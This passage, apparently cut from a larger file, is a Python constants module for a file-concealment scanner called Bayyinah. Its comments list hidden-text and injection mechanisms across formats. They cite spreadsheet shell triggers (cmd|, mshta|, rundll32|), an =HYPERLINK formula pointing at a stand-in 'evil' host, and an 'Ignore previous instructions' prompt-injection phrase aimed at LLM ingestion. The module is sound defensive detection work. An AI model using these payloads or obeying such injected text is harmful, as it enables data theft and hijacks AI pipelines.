"""
Domain configuration — constants that govern Bayyinah's detector semantics.

This module centralises every tunable threshold, character set, severity
weight, and validity tier that the detectors consume. It is the single
source of truth for the *shape* of what Bayyinah considers concealment.

Conceptual grounding (Al-Baqarah 2:8-10, Munafiq Protocol §9):
The munafiq (hypocrite) is defined by the gap between the *zahir* (the
outward / apparent layer — what the observer perceives) and the *batin*
(the inner / hidden layer — what is actually carried). Bayyinah's
detector surface inherits this distinction. Every mechanism is labelled
either zahir — a concealment that lives in the rendered/textual surface
a human reader sees — or batin — a concealment hidden in the document's
inner object graph (catalog actions, embedded files, font CMaps,
metadata, incremental saves).

This file introduces no runtime behaviour — it only exposes the
constants used by the domain dataclasses and by any future analyzer that
binds to the domain layer. Values here mirror ``bayyinah_v0.py`` /
``bayyinah_v0_1.py`` exactly; nothing is altered. This is the "additive
only" invariant of Phase 1.
"""

from __future__ import annotations

from typing import Final, Literal


# ---------------------------------------------------------------------------
# Table of Contents (navigational aid, 1.0 additive polish)
# ---------------------------------------------------------------------------
#
# This file is ~2,000 lines but single-purpose: it holds every tunable
# the detectors depend on — a deliberate architectural choice so that
# "what Bayyinah believes about concealment" lives in one file.
#
# To jump to a specific block, search (Ctrl-F / grep) for the exact
# section title below. Line numbers are intentionally not listed — they
# drift as constants are added, but the titles are stable.
#
#   "Source layer classification"           — zahir/batin per mechanism
#   "Unicode character sets"                — TAG / zero-width / bidi tables
#   "Physics / rendering thresholds"        — font-size, render-mode cutoffs
#   "Phase 10 — image/SVG constants"        — image-layer thresholds
#   "Phase 11 — depth constants"            — advanced image / cross-modal
#   "Phase 12 — cross-modal correlation"    — correlation + generative-crypto
#   "Phase 13 — correlation quality"        — correlation hardening
#   "APS-style severity weights"            — per-mechanism score deductions
#   "Validity tier by mechanism"            — tier 1 / 2 / 3 classification
#   "Scan-incomplete clamp"                 — the 0.5 ceiling on partial scans
#   "Verdict labels (tamyiz)"               — sahih / mushtabih / mukhfi / …
#   "Tier legend"                           — human-readable tier descriptions
#   "Tool identity"                         — TOOL_NAME / TOOL_VERSION
#   "Phase 21 — Configurable safety limits" — ScanLimits dataclass
#   "Module-level default"                  — DEFAULT_LIMITS + limits context
#
# Editing guidance — a new mechanism normally requires additions in
# three places: (1) source-layer classification, (2) APS severity
# weights, and (3) validity tier by mechanism. All three should land
# in the same commit so the tables stay in sync.
#
# ---------------------------------------------------------------------------
# Source layer classification (zahir / batin)
# ---------------------------------------------------------------------------

SourceLayer = Literal["zahir", "batin"]
"""Type alias for the two concealment-locus layers.

zahir — surface / textual / rendered layer. A reader sees the document
and the mechanism's *effect* is in that surface (or suppressed from it).
batin — inner / structural / object layer. The mechanism lives in the
PDF's catalog, action tree, embedded files, fonts, or incremental
saves — places a normal reader never consults.
"""

# Mechanisms whose concealment manifests in the textual/rendered surface.
ZAHIR_MECHANISMS: Final[frozenset[str]] = frozenset({
    "invisible_render_mode",
    "white_on_white_text",
    "microscopic_font",
    "off_page_text",
    # v1.1.2 Day 2 mechanism 03 - parallel pass to off_page_text that
    # reads the raw PDF content stream via pikepdf instead of relying
    # on PyMuPDF's get_text('dict'), which silently drops spans whose
    # origin is outside the page rectangle. Tier 1; classifies as
    # zahir because the structural fact (Tm origin coordinate vs.
    # MediaBox) is observable from the content stream's text-rendering
    # operators with no hidden-state inference. Closes pdf_gauntlet
    # fixture 03_off_page.pdf. See docs/adversarial/pdf_gauntlet/
    # REPORT.md row 03.
    "pdf_off_page_text",
    # v1.1.2 Day 2 mechanism 06 - hidden /Text annotation with
    # suppression bit (Hidden, NoView, or LockedContents) AND non-
    # whitespace /Contents. Tier 1; classifies as zahir because the
    # /F flag and /Contents string are surface-readable from a single
    # walk of /Annots with no hidden-state inference, paralleling
    # pdf_off_page_text and the v1.1.1 off_page_text mechanism.
    # Closes pdf_gauntlet fixture 06_optional_content_group.pdf
    # (filename historical; structural signal is the annotation /F=2
    # bit per pdf_gauntlet/REPORT.md row 06).
    "pdf_hidden_text_annotation",
    "zero_width_chars",
    "bidi_control",
    "tag_chars",
    "overlapping_text",
    "homoglyph",
    # Phase 10 — image/SVG surface-layer concealment. Text carried in
    # image metadata (PNG tEXt/iTXt, JPEG COM, EXIF UserComment) is
    # surface-readable to any parser that inspects the file, but not to
    # the human who merely renders the image — this is the classic
    # performed-alignment shape: the image looks clean on screen while
    # its metadata carries a payload. SVG scripts and event handlers are
    # even more explicit: they execute in the renderer's context and are
    # zahir in the strong sense (they alter what the reader experiences).
    "image_text_metadata",
    "svg_embedded_script",
    "svg_event_handler",
    # Phase 11 — depth additions in the zahir surface.
    # mathematical_alphanumeric covers Unicode U+1D400-U+1D7FF
    # (Mathematical Alphanumeric Symbols). Letters in this block render
    # as bold / italic / script Latin under most fonts, so an LLM or OCR
    # pipeline reads them as ordinary text — yet they live outside the
    # ASCII range and bypass naive string filters. Cross-language /
    # cross-script smuggling vector.
    # svg_hidden_text is text present in the SVG DOM but made invisible
    # via opacity / display / visibility / fill="none" — machine-readable,
    # human-invisible; the definitional performed-alignment shape on a
    # vector image surface.
    # svg_microscopic_text parallels MICROSCOPIC_FONT in the PDF world:
    # text rendered at a sub-visual font size (<= 1).
    "mathematical_alphanumeric",
    "svg_hidden_text",
    "svg_microscopic_text",
    # Phase 15 — DOCX zahir surface. ``docx_hidden_text`` fires when a
    # run inside ``word/document.xml`` carries ``<w:vanish/>`` in its
    # run-properties (``<w:rPr>``). Word renders vanish-marked runs as
    # zero-width on screen, but the text remains in the document's
    # codepoint stream — so every downstream reader (indexer, search
    # engine, LLM ingesting the docx text, OCR fallback) still sees
    # the payload. This is the classic performed-alignment shape at
    # the DOCX surface: the page looks clean while the document body
    # carries hidden content.
    "docx_hidden_text",
    # Phase 17 (v1.1.2) — DOCX hidden-text payload zahir surface.
    # ``docx_white_text`` fires when a run carries a near-white
    # foreground color on a white page background; the text is
    # invisible to a human reader but preserved in the run's
    # ``<w:t>`` stream and read by every downstream extractor.
    # Tier 1 verified, severity 1.00 — mirrors PDF
    # ``white_on_white_text``.
    "docx_white_text",
    # ``docx_microscopic_font`` fires on runs with ``w:sz`` <= 4
    # half-points (2.0pt and below). Same rendered-vs-stored
    # divergence as white-text, but at the font-size axis. Tier 2
    # structural, severity 0.50.
    "docx_microscopic_font",
    # ``docx_header_footer_payload`` applies the white-text and
    # microscopic-font triggers to ``word/header*.xml`` and
    # ``word/footer*.xml`` parts. The header/footer area is a
    # parallel rendering channel that carries the same shape of
    # attack as the body. Tier 1 verified, severity 1.00.
    "docx_header_footer_payload",
    # Phase 16 — HTML zahir surface. ``html_hidden_text`` fires when
    # text content lives inside an element whose style or attributes
    # suppress it from rendering (``display:none``, ``visibility:hidden``,
    # ``opacity:0``, ``font-size:0``, offscreen positioning, the HTML5
    # ``hidden`` attribute, ``aria-hidden="true"``). The text is in the
    # DOM and reachable by every indexer, LLM ingestion pipeline, and
    # copy-paste path — but the visual rendering omits it. Exact
    # performed-alignment shape 2:42 describes: truth mixed with
    # falsehood, the hidden portion of the mixture preserved in the
    # stream while suppressed from the reader's view.
    "html_hidden_text",
    # Phase 16 (v1.1.2) - HTML format-gauntlet zahir surface.
    # ``html_title_text_divergence`` fires when the document's
    # ``<title>`` element value is at least 40 chars long and does not
    # appear anywhere in the rendered body, or exceeds 80 chars
    # outright. Browser tab, bookmarks, search-engine results, and
    # social-media unfurlers display the title while the rendered
    # body shows different content; that asymmetric surface is the
    # smuggling shape this detector targets. Tier 1 verified,
    # severity 1.00. Closes html_gauntlet fixture 06_title_payload.
    "html_title_text_divergence",
    # Phase 17 — XLSX zahir surface. ``xlsx_hidden_row_column`` fires
    # when a worksheet row or column carries ``hidden="1"`` in its
    # descriptor. Excel suppresses those cells from the rendered grid,
    # but the underlying values live unchanged in the shared-strings
    # table and in the sheet's cell stream — every CSV exporter, every
    # ``pandas.read_excel``, every LLM ingesting the workbook sees them.
    # Exact performed-alignment shape at the spreadsheet surface: the
    # visible grid tells one story while the stored data tells another.
    "xlsx_hidden_row_column",
    # Phase 17 (v1.1.2) - XLSX hidden-text payload zahir surface.
    # ``xlsx_white_text`` fires when a cell's resolved font color is
    # near-white against the (white) sheet background; the cell text is
    # invisible to a human reader but preserved in the shared-strings
    # table or the inline ``<is><t>`` element. Tier 1 verified, severity
    # 1.00 - mirrors PDF ``white_on_white_text`` and ``docx_white_text``.
    "xlsx_white_text",
    # ``xlsx_microscopic_font`` fires on cells whose resolved font size
    # is at or below the sub-readable threshold (4.0pt). Same
    # rendered-vs-stored divergence as white-text but at the font-size
    # axis. Tier 2 structural, severity 0.50.
    "xlsx_microscopic_font",
    # ``xlsx_csv_injection_formula`` fires on cell formulas whose body
    # carries a shell-trigger pattern (cmd|, mshta|, rundll32|, DDE())
    # or a HYPERLINK with payload-length display text. The formula
    # text lives in the worksheet part (zahir) but the rendered cell
    # shows only a label or formula result, not the formula body.
    # Tier 1 for shell-trigger patterns, Tier 2 for HYPERLINK payload
    # patterns. Severity 1.00.
    "xlsx_csv_injection_formula",
    # v1.1.2 image gauntlet (F1) zahir surface. SVG is an XML document
    # whose <text> elements live on the rendered surface but can be
    # painted in the canvas color (white) so a human reader sees only
    # blank space. Mirror of pdf white_on_white_text, docx_white_text,
    # and xlsx_white_text on the SVG axis.
    #
    #   svg_white_text             A <text> element with fill=#FFFFFF
    #                              (or near-white #FEFEFE / #FDFDFD /
    #                              #FCFCFC) on a default-or-white SVG
    #                              canvas. Tier 1 verified, severity
    #                              1.00 - mirrors the rest of the
    #                              white-text family.
    "svg_white_text",
    # Phase 19 — EML (RFC 5322 email) zahir surface. Email is the format
    # that most literally ships different content to different audiences
    # (Al-Baqarah 2:42: "do not mix truth with falsehood"). These four
    # mechanisms cover the highest-value surface-layer concealment
    # vectors:
    #
    #   eml_multipart_alternative_divergence
    #                             The message carries both a
    #                             ``text/plain`` and a ``text/html`` part
    #                             inside a ``multipart/alternative`` whose
    #                             normalised contents diverge materially —
    #                             the reader renders the HTML while the
    #                             filter / LLM indexer reads the plain
    #                             text (or vice-versa) and the two see
    #                             different messages. Purest 2:14 pattern
    #                             in email ("they say 'we believe' to the
    #                             believers, 'indeed we are with you' to
    #                             their devils"): one message literally
    #                             ships two different readings to two
    #                             different audiences.
    #
    #   eml_hidden_html_content   An HTML body part contains text inside
    #                             an element whose style or attributes
    #                             suppress it from the rendered view
    #                             (``display:none``, ``visibility:hidden``,
    #                             ``opacity:0``, offscreen positioning,
    #                             the ``hidden`` attribute, zero font
    #                             size, white-on-white color). Parallels
    #                             ``html_hidden_text`` at the HTML format
    #                             level; same performed-alignment shape
    #                             2:42 describes.
    #
    #   eml_display_name_spoof    The ``From`` header's display name
    #                             PERFORMS trust ("Bank Support", "IT
    #                             Team", "noreply@<big-brand>") while
    #                             the actual address sits in an unrelated
    #                             domain. The reader's client prominently
    #                             renders the display name; the real
    #                             sender address is secondary or hidden
    #                             entirely. Classic phishing vector —
    #                             exact performed-alignment shape at the
    #                             envelope surface.
    #
    #   eml_encoded_subject_anomaly
    #                             An RFC 2047 encoded-word in a Subject,
    #                             From, or To header whose decoded content
    #                             carries a concealment class (zero-width
    #                             / TAG / bidi-control / homoglyph /
    #                             math-alphanumeric characters, or an
    #                             oversized encoded payload that decodes
    #                             to opaque bytes). Encoded-words render
    #                             as their decoded text in every mail
    #                             client; the codepoint stream the reader
    #                             perceives as "the subject line" can
    #                             carry adversarial Unicode that text
    #                             filters on the raw header miss.
    "eml_multipart_alternative_divergence",
    "eml_hidden_html_content",
    "eml_display_name_spoof",
    "eml_encoded_subject_anomaly",
    # v1.1.2 EML format-gauntlet zahir mechanisms. Sender identity is
    # the rendered surface readers act on; ``Reply-To`` divergence and
    # base64-wrapping of plain-text bodies both shape what the reader
    # perceives versus what byte-level scanners or reply paths see.
    #
    #   eml_from_replyto_mismatch  ``From`` and ``Reply-To`` resolve to
    #                             different registered domains. The mail
    #                             client renders one sender; replies
    #                             route silently to another. Performed-
    #                             alignment shape (2:14) at the envelope
    #                             surface.
    #
    #   eml_base64_text_part      A ``text/*`` MIME part whose
    #                             ``Content-Transfer-Encoding`` is
    #                             ``base64``. Plain-text bodies travel
    #                             as 7bit or quoted-printable; base64
    #                             wrapping has no legitimate purpose for
    #                             routine text and is a documented
    #                             content-scanner-evasion shape — the
    #                             reader's mail client decodes and
    #                             renders the body, while byte-level
    #                             keyword filters read opaque base64.
    "eml_from_replyto_mismatch",
    "eml_base64_text_part",
    # Phase 20 — CSV / TSV / delimited-data zahir surface.
    # Al-Baqarah 2:42: "Do not mix truth with falsehood, nor conceal
    # the truth while you know it." Delimited-data files are the
    # format where the human and the parser most literally disagree:
    # the human sees a rendered grid (or an Excel preview), the parser
    # sees bytes governed by quoting and delimiter rules nobody
    # inspects. Two zahir-layer mechanisms cover what the reader
    # perceives or what the spreadsheet application will execute:
    #
    #   csv_formula_injection    A cell begins with ``=``, ``+``, ``-``,
    #                             ``@``, TAB, or CR. Excel, LibreOffice
    #                             Calc, and Google Sheets all interpret
    #                             such a cell as a formula — the cell
    #                             "Total" on screen was a literal
    #                             ``=HYPERLINK("http://evil/"&A2,
    #                             "click me")`` in the file. Highest-
    #                             priority zahir mechanism in the
    #                             delimited-data family; exact
    #                             performed-alignment shape 2:42.
    #
    # Per-cell Unicode concealment (zero-width / TAG / bidi / homoglyph)
    # inside a CSV cell is NOT represented by a CSV-specific mechanism —
    # it is represented by the SAME generic mechanism names every other
    # analyzer uses (zero_width_chars, tag_chars, bidi_control,
    # homoglyph), pinned to the exact cell coordinate via the finding's
    # ``location`` field. Keeping the mechanism name shared lets the
    # Phase 12 cross-modal correlation engine compose evidence across
    # PDF / DOCX / XLSX / HTML / EML / CSV at the mechanism level — a
    # single payload that appears in multiple carriers still surfaces as
    # a ``coordinated_concealment`` finding. Parallels the per-cell
    # zahir scans XlsxAnalyzer runs.
    "csv_formula_injection",
    # v1.1.2 F2 mechanism 4: bidi-override codepoint detector. The
    # spreadsheet renderer (Excel, LibreOffice Calc, Google Sheets)
    # honours the Unicode bidi algorithm: a cell carrying U+202A..
    # U+202E or U+2066..U+2069 can render with reversed or reordered
    # glyphs while the byte stream carries the original. The surface
    # diverges from the bytes by definition. Tier 1 zahir, severity
    # 0.25. See analyzers/csv_bidi_payload.py.
    "csv_bidi_payload",
    # v1.1.2 F2 mechanism 5: zero-width codepoint payload. A cell
    # carrying U+200B / U+200C / U+200D, or U+FEFF mid-stream
    # (file-start BOM exempt), is observable from a single
    # deterministic walk of the rendered text content: the
    # codepoint IS in the cell text stream, the spreadsheet
    # renderer simply renders zero pixels for it. Same surface-
    # readable shape as v1.1.1 zero_width_chars (also zahir).
    # Tier 1 zahir, severity 0.20. See
    # analyzers/csv_zero_width_payload.py.
    "csv_zero_width_payload",
    # -----------------------------------------------------------------
    # Phase 24 — video (MP4 / MOV / WEBM / MKV) — Al-Baqarah 2:19-20
    # -----------------------------------------------------------------
    # "Or [it is] like a rainstorm from the sky in which is darkness,
    # thunder and lightning... Every time it lights [the way] for them,
    # they walk therein; but when darkness comes over them, they stand
    # still." The video surface is exactly this storm: a vivid visible
    # playback dominates attention while hidden stems carry concealment
    # — subtitles the viewer never reads, metadata nobody inspects,
    # attachments inside Matroska's Attachments element, cover-art
    # images that may hide LSB payloads, and trailing bytes after the
    # last valid box. Two of these live in the zahir layer because the
    # subtitle text IS rendered to the viewer (even if briefly, or in
    # a corner) — what subtitles display versus what they contain is
    # the direct video analogue of "do not mix truth with falsehood"
    # (2:42):
    #
    #   subtitle_injection         A subtitle track contains
    #                              script-like or HTML-injection
    #                              patterns (``<script>``, on-event
    #                              handlers, data: URIs, javascript:
    #                              URLs). The viewer sees text; the
    #                              subtitle renderer or downstream HTML
    #                              extractor sees markup that can run.
    #
    #   subtitle_invisible_chars   A subtitle track's decoded text
    #                              contains zero-width characters,
    #                              bidirectional controls, Unicode TAG
    #                              characters, or mixed-script
    #                              homoglyph runs. Visible-surface
    #                              concealment at the subtitle layer —
    #                              reuses the exact detection primitives
    #                              ZahirTextAnalyzer applies to PDF
    #                              spans, routed through VideoAnalyzer
    #                              so that the finding is attributed to
    #                              the subtitle track and time range.
    "subtitle_injection",
    "subtitle_invisible_chars",
    # -----------------------------------------------------------------
    # Phase 24 — audio (MP3 / WAV / FLAC / M4A / OGG) — Al-Baqarah 2:93
    # -----------------------------------------------------------------
    # "They said: 'We hear and disobey.'" Audio declares compliance at
    # the surface (we hear) while often carrying disobedience in its
    # depth (and disobey). Identity theft through voice cloning is
    # tazwir and iftira' — fabricating speech and attributing it to a
    # speaker who never uttered it (Al-Nisa 4:112). Two zahir-layer
    # mechanisms attribute concealment inside text fields the listener
    # or an ingestion pipeline would read (lyrics, comments, metadata
    # text atoms):
    #
    #   audio_metadata_injection         A text-valued metadata field
    #                                    (ID3 TIT2/TPE1/COMM, Vorbis
    #                                    TITLE/ARTIST/COMMENT, iTunes
    #                                    ©nam/©ART) carries codepoint-
    #                                    level concealment — zero-width
    #                                    characters, bidirectional
    #                                    controls, Unicode TAG
    #                                    characters, or mixed-script
    #                                    homoglyph runs. Reuses the
    #                                    same primitives ZahirTextAnalyzer
    #                                    applies to PDF spans.
    #
    #   audio_lyrics_prompt_injection    An ID3 USLT / Vorbis LYRICS /
    #                                    iTunes lyric atom carries a
    #                                    script or prompt-injection
    #                                    shape: ``<script>``,
    #                                    ``javascript:``, an instruction
    #                                    preface aimed at an LLM
    #                                    ingestion pipeline ("Ignore
    #                                    previous instructions and..."),
    #                                    or data-URI embedded markup.
    #                                    Lyrics are the subtitle of
    #                                    audio; an ingestion pipeline
    #                                    reads them.
    "audio_metadata_injection",
    "audio_lyrics_prompt_injection",
})

# v1.1.2 - Tier 0 routing mechanisms (the meta-evidence layer).
#
# Tier 0 mechanisms are not concealment findings about the *document*; they
# are disclosure findings about the *scanner's own routing decision*. They
# fire before any per-format analyzer and floor the verdict at mughlaq
# regardless of downstream Tier 1/2/3 findings. The user-facing claim is:
# "the scanner could not honestly decide what kind of file you uploaded;
# here is what was claimed and here is what was inferred."
#
# Tier 0 is structurally distinct from zahir/batin (which classify
# concealment mechanisms); routing transparency is its own layer. The
# ROUTING_MECHANISMS set carries the finding identifiers so the registry
# coherence assertion below can verify SEVERITY and TIER coverage.
#
# See docs/adversarial/mughlaq_trap_REPORT.md and
# docs/scope/v1_1_2_framework_report.md section 3.0 for the rationale.
ROUTING_MECHANISMS: Final[frozenset[str]] = frozenset({
    "format_routing_divergence",
})

# Mechanisms whose concealment lives in the document's inner object graph.
BATIN_MECHANISMS: Final[frozenset[str]] = frozenset({
    "javascript",
    "openaction",
    "additional_actions",
    "launch_action",
    "embedded_file",
    "file_attachment_annot",
    "incremental_update",
    "metadata_anomaly",
    "hidden_ocg",
    "tounicode_anomaly",
    # v1.1.2 Day 2 mechanism 04 - PDF document-metadata concealment.
    # The /Info dictionary and XMP stream live in the document's
    # inner object graph; their text is ingested by AI extractors but
    # never displayed on a rendered page. Classifies as batin (object-
    # graph signal, no rendered-surface presence) per Day 2 prompt
    # section 6.6. Closes pdf_gauntlet fixture 04_metadata.pdf.
    "pdf_metadata_analyzer",
    # v1.1.2 Day 2 mechanism 05 - non-whitespace bytes after the
    # final %%EOF marker. Tier 2 (structural anomaly worth review,
    # not verified concealment). Pure byte scan; no parser needed.
    # Classifies as batin (the trailing region is outside the
    # document's rendered surface and outside its parsed object
    # graph). Closes pdf_gauntlet fixture 05_after_eof.pdf.
    "pdf_trailer_analyzer",
    # Phase 9 — structural concealment in non-PDF formats. A JSON document
    # may silently ship a duplicate key (second occurrence wins in most
    # parsers, first in others — two readers see two meanings); a deeply
    # nested payload can exhaust a naive parser. An ``extension_mismatch``
    # is the file-type analogue of a performed identity: the file says
    # ".md" and is actually an ELF binary. These live in the batin layer
    # because they are structural and not visible to the reader of the
    # rendered surface.
    "duplicate_keys",
    "excessive_nesting",
    "extension_mismatch",
    # Phase 10 — image/SVG structural concealment. Bytes appended after
    # a PNG IEND or JPEG EOI marker are invisible to every correct image
    # decoder yet remain on disk for a non-image reader (shell, forensics
    # tool, payload extractor) to consume. A non-standard ancillary PNG
    # chunk or an unexpected JPEG APP segment is the same shape at a
    # finer granularity. SVG external refs, data: URIs, and foreign
    # objects all live inside the document graph rather than the rendered
    # surface: they change what the renderer reaches for without altering
    # what the first-pass human reader sees.
    "trailing_data",
    "suspicious_image_chunk",
    "oversized_metadata",
    "svg_external_reference",
    "svg_embedded_data_uri",
    "svg_foreign_object",
    # Phase 11 — depth additions in the batin structural layer.
    # suspected_lsb_steganography is the classic least-significant-bit
    # data-hiding signature: after a message is embedded in the LSBs of
    # pixel bytes, the 0/1 distribution of those LSBs becomes
    # statistically uniform — a signature absent from most clean images
    # and from synthetic clean fixtures. Tier-3 interpretive (the
    # detector is a necessary condition, not a sufficient one).
    # high_entropy_metadata catches base64- / encryption- / random-looking
    # payloads masquerading as metadata text (keys, blobs, packed data)
    # — the generative-cryptography shape: content that passes a
    # text-metadata sniff but whose byte distribution is cryptographically
    # dense.
    # multiple_idat_streams is an IDAT sequence interrupted by a
    # non-IDAT chunk — structurally legal but diagnostically unusual;
    # standard encoders emit contiguous IDATs. Fragmentation is a known
    # carrier pattern for interleaved private payloads.
    "suspected_lsb_steganography",
    "high_entropy_metadata",
    "multiple_idat_streams",
    # Phase 12 — cross-modal correlation and generative cryptography.
    # coordinated_concealment fires when the same normalised hidden-payload
    # hash appears in two or more distinct findings within a single file —
    # evidence that the document ships the same concealed content across
    # multiple carrier layers (e.g. a TAG payload in SVG text *and* in a
    # PNG tEXt chunk inside the same page). The shape is diagnostic: a
    # file using one concealment mechanism is suspect; a file using two
    # to carry the same byte string is coordinated.
    # generative_cipher_signature fires when a metadata payload both has
    # the statistical density of random data AND matches a canonical
    # cipher/packed-payload shape (base64-range characters, hex run).
    # This is the specific shape AI-generated ciphertext takes when it
    # is deposited into document metadata — a narrower signal than
    # high_entropy_metadata on its own.
    # cross_format_payload_match is the batch-scan analogue of
    # coordinated_concealment: the same hidden-payload hash appears in
    # two or more files scanned together. Only emitted by
    # ``ScanService.scan_batch`` — never by a single-file scan.
    "coordinated_concealment",
    "generative_cipher_signature",
    "cross_format_payload_match",
    # Phase 15 — DOCX batin (structural) surface. These live in the
    # document's ZIP graph and relationships, not in the rendered
    # paragraph stream.
    #   docx_vba_macros          A ``word/vbaProject.bin`` entry is
    #                             present. VBA macros in a Word document
    #                             are active code the moment the reader
    #                             enables content; this is the DOCX
    #                             analogue of PDF javascript.
    #   docx_embedded_object     One or more entries under
    #                             ``word/embeddings/`` — OLE objects,
    #                             other Office documents, or arbitrary
    #                             files. DOCX's analogue of PDF's
    #                             embedded_file.
    #   docx_alt_chunk           An altChunk part is declared in the
    #                             relationships. altChunk inserts the
    #                             content of another document (HTML,
    #                             MHT, even another DOCX) at render
    #                             time — a payload carrier for content
    #                             whose origin is disjoint from the
    #                             main document body.
    #   docx_external_relationship
    #                             A relationship with
    #                             ``TargetMode="External"`` — the
    #                             document reaches outside itself when
    #                             opened. Phishing / tracking beacon
    #                             vector (remote images, remote
    #                             stylesheets, remote macros in older
    #                             templates). Parallels
    #                             svg_external_reference.
    #   docx_revision_history    ``<w:ins>`` or ``<w:del>`` elements in
    #                             document.xml indicate tracked changes
    #                             are preserved. The edit history is not
    #                             itself adversarial, but the prior
    #                             revision is not visible to a reader
    #                             who only opens the final view —
    #                             interpretive (tier 3), parallel to
    #                             PDF incremental_update.
    "docx_vba_macros",
    "docx_embedded_object",
    "docx_alt_chunk",
    "docx_external_relationship",
    "docx_revision_history",
    # Phase 17 (v1.1.2) — DOCX hidden-text payload batin surface.
    # ``docx_metadata_payload`` fires on hidden-text payloads in
    # ``docProps/core.xml`` / ``docProps/app.xml`` /
    # ``docProps/custom.xml`` metadata parts: long fields exceeding
    # the per-field byte limit, or content-summary fields whose
    # text diverges from the rendered document body. Tier 1
    # verified, severity 1.00.
    "docx_metadata_payload",
    # ``docx_comment_payload`` fires on comments in
    # ``word/comments.xml`` whose ``w:id`` is not referenced from
    # ``document.xml`` (orphan reference) or whose body is long and
    # divergent from rendered text. Comments are a legitimate
    # review channel, so this stays at Tier 2 structural, severity
    # 0.50.
    "docx_comment_payload",
    # ``docx_orphan_footnote`` fires on footnotes in
    # ``word/footnotes.xml`` whose ``w:id`` is not referenced from
    # ``document.xml`` via ``<w:footnoteReference>`` markers.
    # Infrastructure footnote types (``separator``,
    # ``continuationSeparator``) are filtered out; only user-content
    # orphans fire. Tier 1 verified, severity 1.00 — mirrors PDF
    # ``pdf_hidden_text_annotation`` in spirit.
    "docx_orphan_footnote",
    # Phase 16 — HTML batin surface. HTML mixes rendered content with
    # structure more aggressively than any other format Bayyinah reads;
    # these mechanisms target the three highest-value concealment
    # vectors:
    #   html_inline_script       A ``<script>`` tag with inline content
    #                             or an ``on*=`` event handler on any
    #                             element — executable code that runs
    #                             in the renderer's context without the
    #                             reader authorising it. Most dangerous
    #                             HTML concealment vector; parallels
    #                             svg_embedded_script.
    #   html_data_attribute      A ``data-*`` attribute whose value is
    #                             long (>= DATA_ATTRIBUTE_MIN_LENGTH)
    #                             and therefore plausibly a packed
    #                             payload rather than a short id / flag.
    #                             Most subtle vector: custom data- attrs
    #                             are routine, so a reader does not
    #                             instinctively inspect them.
    #   html_external_reference  A resource-loading attribute (``src``,
    #                             ``href`` on ``<link>``, ``action`` on
    #                             ``<form>``, etc.) pointing at an
    #                             absolute remote URL — the renderer
    #                             reaches outside the document when the
    #                             page opens. Phishing beacon / tracking
    #                             pixel / remote-code-load shape.
    #                             Parallels docx_external_relationship
    #                             and svg_external_reference.
    "html_inline_script",
    "html_data_attribute",
    "html_external_reference",
    # Phase 17 — XLSX batin surface (Al-Baqarah 2:79: "Woe to those who
    # write the book with their own hands, then say, 'This is from
    # Allah,' in order to exchange it for a small price."). The verse
    # describes a spreadsheet's attack surface exactly: structured,
    # numerical, trustworthy-looking data written with hidden payloads
    # and then presented as clean input. These six mechanisms span the
    # priority bands:
    #
    # Tier 1 — most dangerous (verified active / embedded content):
    #   xlsx_vba_macros          An ``xl/vbaProject.bin`` entry is
    #                             present. VBA in a workbook is active
    #                             code the moment the reader enables
    #                             content; this is the XLSX analogue of
    #                             docx_vba_macros and PDF javascript
    #                             (all tier 1).
    #   xlsx_embedded_object     One or more entries under
    #                             ``xl/embeddings/`` — OLE objects,
    #                             other Office documents, or packaged
    #                             binaries. Mirrors docx_embedded_object.
    #
    # Tier 2 — most common (structural concealment of prior state):
    #   xlsx_revision_history    Entries under ``xl/revisions/``
    #                             (revisionHeaders.xml / revisionLog*.xml)
    #                             indicate shared-workbook tracked
    #                             changes are preserved. The final view
    #                             is authoritative, but the prior
    #                             revision is accessible to any reader
    #                             that walks the revisions parts.
    #                             Parallels docx_revision_history and
    #                             PDF incremental_update (all tier 3).
    #   xlsx_hidden_sheet        A ``<sheet state="hidden">`` or
    #                             ``<sheet state="veryHidden">``
    #                             declaration in workbook.xml. The
    #                             worksheet exists (with its own cell
    #                             data) but is not listed in the tab
    #                             bar; ``veryHidden`` is only reachable
    #                             through the VBA IDE.
    #
    # Tier 2-3 — most subtle (external linkage / formula-based payload):
    #   xlsx_external_link       Entries under ``xl/externalLinks/`` or
    #                             a relationship with
    #                             ``TargetMode="External"``. Workbooks
    #                             can reference other workbooks on disk
    #                             or across the network at open-time;
    #                             mirrors docx_external_relationship.
    #   xlsx_data_validation_formula
    #                             A ``<dataValidations>`` block whose
    #                             ``<formula1>`` / ``<formula2>`` carries
    #                             a non-constant expression. Data
    #                             validation is a legitimate feature, but
    #                             a custom formula can call ``INDIRECT``,
    #                             ``HYPERLINK``, or reference external
    #                             names — a subtle carrier for
    #                             concealed logic inside what looks
    #                             like input validation.
    "xlsx_vba_macros",
    "xlsx_embedded_object",
    "xlsx_revision_history",
    "xlsx_hidden_sheet",
    "xlsx_external_link",
    "xlsx_data_validation_formula",
    # Phase 17 (v1.1.2) - XLSX hidden-text payload batin surface.
    # ``xlsx_metadata_payload`` fires on hidden-text payloads in
    # ``docProps/core.xml`` / ``docProps/app.xml`` /
    # ``docProps/custom.xml`` metadata parts: long fields exceeding
    # the 512-byte per-field limit, or content-summary fields whose
    # text diverges from the rendered cell text. Tier 1 verified,
    # severity 1.00. Mirrors ``docx_metadata_payload`` and PDF
    # ``pdf_metadata_analyzer``.
    "xlsx_metadata_payload",
    # ``xlsx_defined_name_payload`` fires on entries in the
    # ``<definedNames>`` block of ``xl/workbook.xml`` whose body is
    # a string-literal value (quoted) or a long unquoted string
    # rather than a range reference or formula. Defined names are
    # registered in the workbook part and accessible to every
    # formula evaluator and package walker but invisible from the
    # rendered grid. Tier 2 structural, severity 0.50.
    "xlsx_defined_name_payload",
    # ``xlsx_comment_payload`` fires on cell comments in
    # ``xl/comments/comment*.xml`` (and threaded comments in
    # ``xl/threadedComments/*.xml``) whose text body meets the
    # payload-length threshold. Comments are rendered only on hover
    # and are skipped by most automated table readers, but they
    # live in the workbook package. Tier 2 structural, severity
    # 0.50.
    "xlsx_comment_payload",
    # Phase 16 (v1.1.2) - HTML format-gauntlet batin surface. Five new
    # mechanisms close the five remaining html_gauntlet fixtures by
    # surfacing payload bodies inside HTML loci that the existing
    # HtmlAnalyzer walker intentionally skips (non-visible containers,
    # comments, meta content, CSS pseudo-element content). All five
    # are Tier 1 byte-deterministic with severity 1.00.
    #
    # ``html_noscript_payload`` - text body inside a ``<noscript>``
    # element. Browsers render <noscript> only when JavaScript is
    # disabled, but indexers, crawlers, and LLM ingestion paths read
    # the body verbatim regardless of script state. Closes
    # 01_noscript.
    "html_noscript_payload",
    # ``html_template_payload`` - text body inside a ``<template>``
    # element. Browsers parse but do not render template contents
